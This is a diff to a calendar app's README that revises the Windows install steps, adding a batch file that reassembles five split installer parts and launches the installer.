@@ -12,15 +12,16 @@ A simple calendar that **never lets you miss an event**. Alarms ring on your pho
 [How to install on Android](https://github.com/0MrCrazy0/calendar/blob/main/Simple-Calendar-Android-Installer/README-Android.md)
 
 ### 💻 Windows
-Download all 5 parts into the same folder:
+Download these 6 files into the same folder:
 
 1. [⬇️ Part 1](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.00.part)
 2. [⬇️ Part 2](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.01.part)
 3. [⬇️ Part 3](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.02.part)
 4. [⬇️ Part 4](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.03.part)
 5. [⬇️ Part 5](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.04.part)
+6. [⬇️ Install-Simple-Calendar.bat](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Install-Simple-Calendar.bat)
 
-Then follow [How to install on Windows](https://github.com/0MrCrazy0/calendar/blob/main/Simple-Calendar-Windows-Installer/README-Windows.md). It takes about 2 minutes.
+Then double-click **Install-Simple-Calendar.bat**. It builds and opens the installer for you. Need help? See [How to install on Windows](https://github.com/0MrCrazy0/calendar/blob/main/Simple-Calendar-Windows-Installer/README-Windows.md). It takes about 2 minutes.
 
 *iPhone isn't supported yet.*
 
